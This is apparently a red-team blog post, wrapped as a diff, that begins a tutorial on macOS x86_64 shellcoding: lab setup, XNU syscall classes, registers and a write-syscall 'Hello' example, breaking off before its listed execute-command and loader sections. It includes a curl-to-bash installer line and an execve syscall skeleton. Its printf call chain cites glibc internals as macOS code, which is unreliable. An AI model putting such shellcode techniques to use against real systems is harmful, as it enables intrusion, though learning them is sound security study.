@@ -1,0 +1,634 @@
+<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><link rel="canonical" href="https://www.redteamrecipes.com/2025/11/shellcoding-on-macos-64/"><title>macOS Shellcoding in depth on x86_6 | RTR</title><meta name="description" content="The only cookbook where evasions are on the menu"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><link rel="icon" href="/favicons/favicon.ico"><link rel="apple-touch-icon" href="/favicons/favicon.ico"><link rel="icon" type="image/svg+xml" href="/favicons/favicon.svg"><link rel="preload" href="/style/base.css" as="style"><link rel="preload" href="/js/common.js" as="script"><link rel="stylesheet" href="/style/base.css"><meta name="description" content="IntroductionThis guide explores shellcoding on the x86_64 architecture for macOS, bypassing the traditional x86 starting point for a practical reason: with the release of macOS 10.15 (Catalina), Apple discontinued support for 32-bit applications entirely. Since x86_64 maintains backward compatibility with x86 code anyway, focusing on 64-bit shellcoding mak.."><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/feed.atom" title="RedTeam Recipes" type="application/atom+xml">
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">RedTeam Recipes</a></h2></section><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/" target="_top">Home</a></h3><h3 class="is-inline-block"><a href="/about/" target="_top">About</a></h3><h3 class="is-inline-block"><a href="/contact/" target="_top">contact</a></h3><h3 class="is-inline-block"><a href="/services/" target="_top">services</a></h3><h3 class="is-inline-block"><a href="/hall-of-fame/" target="_top">hall of fame</a></h3><h3 class="is-inline-block"><a href="/questions/" target="_top">questions</a></h3><h3 class="is-inline-block"><a href="/partners/" target="_top">trusted partners</a></h3><h3 class="is-inline-block"><a href="/privacy-policy/" target="_top">privacy policy</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/" target="_top">Home</a></h3><h3 class="is-inline-block"><a href="/about/" target="_top">About</a></h3><h3 class="is-inline-block"><a href="/contact/" target="_top">contact</a></h3><h3 class="is-inline-block"><a href="/services/" target="_top">services</a></h3><h3 class="is-inline-block"><a href="/hall-of-fame/" target="_top">hall of fame</a></h3><h3 class="is-inline-block"><a href="/questions/" target="_top">questions</a></h3><h3 class="is-inline-block"><a href="/partners/" target="_top">trusted partners</a></h3><h3 class="is-inline-block"><a href="/privacy-policy/" target="_top">privacy policy</a></h3></header><main><main class="container section post-page pt-4 px-3"><div class="columns content is-flex-desktop is-justify-content-center is-flex-direction-row-reverse px-1"><div class="column is-3 toc-container is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-Setup"><span class="toc-text">Lab Setup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XNU-Syscall-Classes"><span class="toc-text">XNU Syscall Classes</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x86-64-Calling-Conventions-and-Registers"><span class="toc-text">x86_64 Calling Conventions and Registers</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Calling-Conventions-Table"><span class="toc-text">Calling Conventions Table</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shellcoding"><span class="toc-text">Shellcoding</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Print-%E2%80%98Hello%E2%80%99"><span class="toc-text">Print ‘Hello’</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Call-Chain-printf-%E2%86%92-write-Syscall"><span class="toc-text">Call Chain: printf → write Syscall</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exit"><span class="toc-text">Exit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kill-a-Process"><span class="toc-text">Kill a Process</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Execute-Command"><span class="toc-text">Execute Command</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Extract-Shellcode"><span class="toc-text">Extract Shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#objdump"><span class="toc-text">objdump</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#otool"><span class="toc-text">otool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Test-Shellcode-with-Loader"><span class="toc-text">Test Shellcode with Loader</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exercises"><span class="toc-text">Exercises</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Help"><span class="toc-text">Help ?</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#References"><span class="toc-text">References</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#footer"><span class="toc-text">Comments and More</span></a></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/categories/Exploit-Development/"><i class="tag post-item-tag">Exploit Development</i></a><a href="/tags/MacOS/"><i class="tag post-item-tag">MacOS</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">macOS Shellcoding in depth on x86_6</h1><time class="has-text-grey" datetime="2025-11-23T22:00:00.000Z">2025-11-24</time><article class="mt-2 post-content"><div class="is-hidden-tablet mb-4"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-Setup"><span class="toc-text">Lab Setup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XNU-Syscall-Classes"><span class="toc-text">XNU Syscall Classes</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x86-64-Calling-Conventions-and-Registers"><span class="toc-text">x86_64 Calling Conventions and Registers</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Calling-Conventions-Table"><span class="toc-text">Calling Conventions Table</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shellcoding"><span class="toc-text">Shellcoding</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Print-%E2%80%98Hello%E2%80%99"><span class="toc-text">Print ‘Hello’</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Call-Chain-printf-%E2%86%92-write-Syscall"><span class="toc-text">Call Chain: printf → write Syscall</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exit"><span class="toc-text">Exit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kill-a-Process"><span class="toc-text">Kill a Process</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Execute-Command"><span class="toc-text">Execute Command</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Extract-Shellcode"><span class="toc-text">Extract Shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#objdump"><span class="toc-text">objdump</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#otool"><span class="toc-text">otool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Test-Shellcode-with-Loader"><span class="toc-text">Test Shellcode with Loader</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exercises"><span class="toc-text">Exercises</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Help"><span class="toc-text">Help ?</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#References"><span class="toc-text">References</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#footer"><span class="toc-text">Comments and More</span></a></li></ol></li></ol></div><div><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This guide explores shellcoding on the <code>x86_64</code> architecture for <code>macOS</code>, bypassing the traditional x86 starting point for a practical reason: with the release of macOS 10.15 (<code>Catalina</code>), Apple discontinued support for <code>32-bit</code> applications entirely. Since <code>x86_64</code> maintains backward compatibility with x86 code anyway, focusing on <code>64-bit</code> shellcoding makes the most sense for modern <code>macOS</code> systems. Before diving in, you’ll need at least a basic understanding of assembly language—this isn’t an assembly tutorial, so if you’re unfamiliar with the fundamentals, take some time to learn them first and return when you’re ready for the challenge. Rather than immediately jumping into cryptic assembly instructions, this guide follows a practical workflow: start by writing code in <code>C</code>, identify the necessary system calls, and then translate everything into assembly. This approach leverages the wealth of existing <code>C</code> documentation and resources, making the process significantly more manageable. You’ll find countless examples of how to build network clients, manipulate processes, or execute commands in <code>C</code>, but you’d be hard-pressed to find someone talking about implementing these same tasks purely in assembly. Let’s start with our Blogpost.</p>
+<blockquote>
+<p>You can find all the code on my github: <a target="_blank" rel="noopener" href="https://github.com/Zeyad-Azima/macOShellcoding">https://github.com/Zeyad-Azima/macOShellcoding</a></p>
+</blockquote>
+<h1 id="Lab-Setup"><a href="#Lab-Setup" class="headerlink" title="Lab Setup"></a>Lab Setup</h1><p>Let’s Setup our Lab and the required tools, Let’s list all the other tools we need. </p>
+<ul>
+<li>Homebrew</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">/bin/bash -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure></figure>
+
+<ul>
+<li>Xcode:</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">We can download it from `AppStore`.</span><br><span class="line">or: https://xcodereleases.com</span><br></pre></td></tr></table></figure></figure>
+
+<ul>
+<li>Xcode Command Line Tools (CLT)</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">xcode-select --install</span><br></pre></td></tr></table></figure></figure>
+
+<ul>
+<li>Nasm</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">brew install nasm</span><br></pre></td></tr></table></figure></figure>
+
+<ul>
+<li>Binutils (<code>ld</code>)</li>
+</ul>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">brew install binutils</span><br></pre></td></tr></table></figure></figure>
+
+<p>Before we go on straight to shellcoding, We need to understand some FUNDAMENTALS first we would be using to be able to write shellcodes. As we know the macos kernel (<code>XNU</code>) is a hybrid kernel which contains also <code>BSD</code>. We need to download the <code>XNU</code> source code. Cause we will use it for references in creating ours shellcodes and understanding <code>syscalls</code> on <code>macOS</code>. We can download it from <a target="_blank" rel="noopener" href="https://opensource.apple.com/releases/">here</a>.</p>
+<p>Now, We need to download the source code version that matches the macOS you writing the shellcode for. I am on <code>macOS Sequoia</code> and the version is <code>macOS 15.5</code>. You can use <code>sw_vers</code> command to check it.</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">~ % sw_vers</span><br><span class="line">ProductName:		macOS</span><br><span class="line">ProductVersion:		15.5</span><br><span class="line">BuildVersion:		24F74</span><br></pre></td></tr></table></figure></figure>
+
+<p>Now, Let’s download the <code>XNU</code> VERSION FOR it.</p>
+<p><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/macos/xnu-release-page.png" width="" height="" srcset="" alt="macOS XNU release page" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture><figcaption>macOS XNU release page</figcaption></figure></p>
+<p>When we scroll down more we can find it.</p>
+<p><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/macos/xnu-version-block.png" width="" height="" srcset="" alt="XNU version block" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture><figcaption>XNU version block</figcaption></figure></p>
+<p>That’s the version (<code>xnu-11417.121.6</code>) of <code>macOS 15.5</code>.</p>
+<h1 id="XNU-Syscall-Classes"><a href="#XNU-Syscall-Classes" class="headerlink" title="XNU Syscall Classes"></a>XNU Syscall Classes</h1><p>Now, Let’s open it with <code>VSCode</code> or your favorite <code>IDE/CodeEditor</code>.</p>
+<p><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/macos/xnu-tree.png" width="" height="" srcset="" alt="XNU source tree in VS Code" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture><figcaption>XNU source tree in VS Code</figcaption></figure></p>
+<p>All these files and folders for kernel we will use just some of it to understand the basics, But while we writing our shellcodes we would be navigating a lot through different files and folders. First Let’s go to <code>osfmk/mach/i386/syscall_sw.h</code>.</p>
+<p><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/macos/syscall-header.png" width="" height="" srcset="" alt="syscall header snippet" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture><figcaption>syscall header snippet</figcaption></figure></p>
+<p>starting on line <code>135</code> till <code>152</code>, That’s what matters of us. In here as we know and mentioned before that <code>XNU</code> is hybrid, So if you want to make execute a syscall for related to <code>BSD</code> you would need to define the entry to it.</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_CLASS_SHIFT	24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_CLASS_MASK	(0xFF &lt;&lt; SYSCALL_CLASS_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_NUMBER_MASK	(~SYSCALL_CLASS_MASK)</span></span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_CLASS_NONE	0	<span class="comment">/* Invalid */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_CLASS_MACH	1	<span class="comment">/* Mach */</span>	</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_CLASS_UNIX	2	<span class="comment">/* Unix/BSD */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_CLASS_MDEP	3	<span class="comment">/* Machine-dependent */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_CLASS_DIAG	4	<span class="comment">/* Diagnostics */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_CLASS_IPC	5	<span class="comment">/* Mach IPC */</span></span></span><br></pre></td></tr></table></figure></figure>
+
+<p>In <code>XNU</code> (the kernel underlying <code>macOS</code>, <code>iOS</code>, etc.), system calls are not uniformly accessed via a single syscall table like in <code>Linux</code>. Instead, <code>XNU</code> uses syscall classes to route calls through different subsystems. Each system call class is associated with a unique number, which is shifted left by 24 bits (defined by <code>SYSCALL_CLASS_SHIFT</code>) to determine its class. So for every class to get the entry it will be as the following:</p>
+<figure class="my-table"><table>
+<thead>
+<tr>
+<th>Class</th>
+<th>Name</th>
+<th>Value</th>
+<th>Shifted Base (<code>&lt;&lt; 24</code>)</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td><code>SYSCALL_CLASS_NONE</code></td>
+<td>0</td>
+<td><code>0x00000000</code></td>
+<td>Invalid</td>
+</tr>
+<tr>
+<td>1</td>
+<td><code>SYSCALL_CLASS_MACH</code></td>
+<td>1</td>
+<td><code>0x01000000</code></td>
+<td>Mach traps</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>SYSCALL_CLASS_UNIX</code></td>
+<td>2</td>
+<td><code>0x02000000</code></td>
+<td><strong>BSD syscalls</strong></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>SYSCALL_CLASS_MDEP</code></td>
+<td>3</td>
+<td><code>0x03000000</code></td>
+<td>Machine-dependent</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>SYSCALL_CLASS_DIAG</code></td>
+<td>4</td>
+<td><code>0x04000000</code></td>
+<td>Diagnostics</td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>SYSCALL_CLASS_IPC</code></td>
+<td>5</td>
+<td><code>0x05000000</code></td>
+<td>Mach IPC (newer)</td>
+</tr>
+</tbody></table></figure>
+<blockquote>
+<p>BSD &#x3D; 0x02 &lt;&lt; 24 &#x3D; 0x02000000 → 0x2000000</p>
+</blockquote>
+<p>The <code>SYSCALL_CLASS_MASK</code> and <code>SYSCALL_NUMBER_MASK</code> are used to extract the class and syscall number respectively. For example, a traditional <code>BSD</code> system call such as <code>execve</code> (system call number <code>59</code> or <code>0x3b</code> in hex) in the <code>SYSCALL_CLASS_UNIX</code> (number <code>2</code>) would be represented as <code>0x200003b</code> when passed to the syscall assembly instruction.</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">; Assembly example to make a syscall with execve (BSD) in macOS</span><br><span class="line">mov rax, 0x200003b  ; Load the syscall number for execve (59 with class mask)</span><br><span class="line">mov rdi, address    ; Address of the command to execute</span><br><span class="line">mov rsi, argv       ; Pointer to an array of arguments</span><br><span class="line">mov rdx, envp       ; Pointer to an array of environment variables</span><br><span class="line">syscall             ; Make the system call</span><br></pre></td></tr></table></figure></figure>
+
+<p>To make it clear, You’re dining in the <code>XNU</code> restaurant, a multi-level establishment where each floor represents a different system call class, and the kitchen routes your order based on a cleverly encoded ticket. The first floor, <code>SYSCALL_CLASS_MACH</code> (class 1), serves hearty main courses like task and thread operations, while the second floor, <code>SYSCALL_CLASS_UNIX</code> (class 2), specializes in classic <code>BSD</code> desserts such as <code>execve</code> and <code>write</code>. To order a medium-rare steak — item number <code>0x3B</code> (59) on the Mach floor — you must tell the waiter <code>0x0100003B</code>, calculated as <code>(1 &lt;&lt; 24) | 0x3B</code>. Craving tiramisu (<code>execve</code>, also #59) from the <code>BSD</code> floor? Your order becomes <code>0x0200003B</code> — same dish number, different floor, computed as <code>(2 &lt;&lt; 24) | 0x3B</code>. Just like in <code>XNU</code>, never shout just “59” — the kitchen needs the full encoded number with the class shifted 24 bits left, ensuring your steak doesn’t arrive as a dessert (and vice versa). Bon appétit in the kernel!</p>
+<h1 id="x86-64-Calling-Conventions-and-Registers"><a href="#x86-64-Calling-Conventions-and-Registers" class="headerlink" title="x86_64 Calling Conventions and Registers"></a>x86_64 Calling Conventions and Registers</h1><p>In the <strong>x86-64 System</strong> used by macOS, function arguments are passed via registers in this order: <code>RDI</code> holds the 1st argument, <code>RSI</code> the 2nd, <code>RDX</code> the 3rd (and sometimes the 2nd return value), <code>RCX</code> the 4th, <code>R8</code> the 5th, and <code>R9</code> the 6th. The return value (or syscall number) is placed in <code>RAX</code>, while <code>RIP</code> points to the next instruction, <code>RSP</code> manages the stack (and must be <strong>16-byte aligned</strong> before any function call), <code>RBP</code> serves as the frame pointer for stack frames, and <code>RBX</code> acts as a general-purpose base register often preserved across calls. If a function requires more than six arguments, additional arguments are passed on the stack. It is essential to ensure that the <code>RSP</code> is properly aligned before making a function call. Despite system calls often working without strict alignment, adhering to this requirement is a good practice to avoid unexpected behavior. To illustrate how these registers are used in a function call, consider a function <code>foo</code> that takes three arguments.</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line">; Assume arg1, arg2, and arg3 are already set with appropriate values</span><br><span class="line">mov rax, syscall_number</span><br><span class="line">mov rdi, arg1 ; 1st argument</span><br><span class="line">mov rsi, arg2 ; 2nd argument</span><br><span class="line">mov rdx, arg3 ; 3rd argument</span><br><span class="line">syscall      ; Execute syscall</span><br></pre></td></tr></table></figure></figure>
+
+<h2 id="Calling-Conventions-Table"><a href="#Calling-Conventions-Table" class="headerlink" title="Calling Conventions Table"></a>Calling Conventions Table</h2><p>You can use this table as a reference.</p>
+<figure class="my-table"><table>
+<thead>
+<tr>
+<th>Register</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>RDI</code></td>
+<td>1st function argument</td>
+</tr>
+<tr>
+<td><code>RSI</code></td>
+<td>2nd function argument</td>
+</tr>
+<tr>
+<td><code>RDX</code></td>
+<td>3rd function argument (and optionally the 2nd return value)</td>
+</tr>
+<tr>
+<td><code>RCX</code></td>
+<td>4th function argument</td>
+</tr>
+<tr>
+<td><code>R8</code></td>
+<td>5th function argument</td>
+</tr>
+<tr>
+<td><code>R9</code></td>
+<td>6th function argument</td>
+</tr>
+<tr>
+<td><code>RAX</code></td>
+<td>Function return value&#x2F;Syscall Number</td>
+</tr>
+<tr>
+<td><code>RIP</code></td>
+<td>Instruction pointer</td>
+</tr>
+<tr>
+<td><code>RSP</code></td>
+<td>Stack pointer (must be 16-byte aligned before calls)</td>
+</tr>
+<tr>
+<td><code>RBP</code></td>
+<td>Frame pointer</td>
+</tr>
+<tr>
+<td><code>RBX</code></td>
+<td>Base pointer (optional use)</td>
+</tr>
+</tbody></table></figure>
+<h1 id="Shellcoding"><a href="#Shellcoding" class="headerlink" title="Shellcoding"></a>Shellcoding</h1><p>Before writing our shellcode, To make it easy for ourselves instead of getting lost in all the assembly instructions, The best workflow to do is to write your code in <code>C</code>, then we convert it to assembly which will make it very easy for us, As there are references and resources for <code>C</code> it will make our process easier. For example, You would find people talking about how to make a client&#x2F;server in <code>C</code> using <code>socket</code>. But, you won’t find someone(“insane”) talking about how to make a client&#x2F;server in assembly. So The process would be as the following:</p>
+<ul>
+<li>Find <code>C</code> functions that we will need in our code.</li>
+<li>Write our code in <code>C</code>.</li>
+<li>Turn our code into assembly.<ul>
+<li>Which including getting our syscall numbers ready.</li>
+<li>Function arguments and types.</li>
+</ul>
+</li>
+</ul>
+<p>Let’s go ahead and start with something simple to make things clear.</p>
+<h2 id="Print-‘Hello’"><a href="#Print-‘Hello’" class="headerlink" title="Print ‘Hello’"></a>Print ‘Hello’</h2><p>We will start by printing <code>Hello</code> into the screen. So let’s apply our workflow. Usually when we want to print something in <code>C</code>, we use <code>printf()</code> function as the following:</p>
+<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></figure>
+
+<p>Now, As we identified the functions we need which is <code>printf()</code>, And we wrote our code the 3rd step is to turn it into assembly. So the first thing we would need is to get the syscall number for <code>printf()</code>, We can find all the <code>syscalls</code> can be found in <code>bsd/kern/syscalls.master</code>.  </p>
+<p><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/macos/syscall-master.png" width="" height="" srcset="" alt="syscalls master snippet" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture><figcaption>syscalls master snippet</figcaption></figure></p>
+<p>But, the thing is we won’t find <code>printf()</code> in the file. Let’s investigate the <code>printf()</code> function source code. After investigation, the implementation of <code>printf()</code> involves calling other functions till we reach <code>write</code> syscall.</p>
+<h3 id="Call-Chain-printf-→-write-Syscall"><a href="#Call-Chain-printf-→-write-Syscall" class="headerlink" title="Call Chain: printf → write Syscall"></a>Call Chain: <code>printf</code> → <code>write</code> Syscall</h3><figure class="my-table"><table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Function Name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><code>printf</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>vfprintf</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>__vfprintf_internal</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>Xprintf_buffer_write</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>_IO_new_file_overflow</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>_IO_do_write</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>new_do_write</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td><code>_IO_SYSWRITE</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td><code>__swrite</code> <em>(macOS only)</em></td>
+</tr>
+<tr>
+<td>10</td>
+<td><code>write</code> <em>(syscall)</em></td>
+</tr>
+</tbody></table></figure>
+<p>You can find the source code files here:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://codebrowser.dev/glibc/glibc/stdio-common/printf.c.html">printf.c</a></li>
+<li><a target="_blank" rel="noopener" href="https://codebrowser.dev/glibc/glibc/stdio-common/vfprintf.c.html">vfprintf.c</a></li>
+<li><a target="_blank" rel="noopener" href="https://codebrowser.dev/glibc/glibc/stdio-common/vfprintf-internal.c.html">vfprintf-internal.c</a></li>
+<li><a target="_blank" rel="noopener" href="https://codebrowser.dev/glibc/glibc/stdio-common/printf_buffer.h.html">printf_buffer.h</a></li>
+<li><a target="_blank" rel="noopener" href="https://codebrowser.dev/glibc/glibc/libio/fileops.c.html">fileops.c</a></li>
+<li><a target="_blank" rel="noopener" href="https://codebrowser.dev/glibc/glibc/libio/libioP.h.html">libioP.h</a></li>
+</ul>
+<p>Also you could just have asked <code>ChatGPT</code> or something xD, But keep in mind with complicated shellcodes you would want to go through codes and else cause you always will learn something and upgrade yourself.</p>
+<p>Now, When we search for <code>write</code> syscall we can see it in the <code>syscalls.master</code> file:</p>
+<p><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/macos/printf-callchain.png" width="" height="" srcset="" alt="printf call chain trace" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture><figcaption>printf call chain trace</figcaption></figure></p>
+<p>As we see the <code>write</code> syscall number is <code>4</code>. And <code>write</code> takes 3 arguments. We need to learn about these argument and how to use it, Which simple can be done by searching it or go to the documentation:</p>
+<p><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/macos/printf-flow.png" width="" height="" srcset="" alt="printf flow diagram" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture><figcaption>printf flow diagram</figcaption></figure></p>
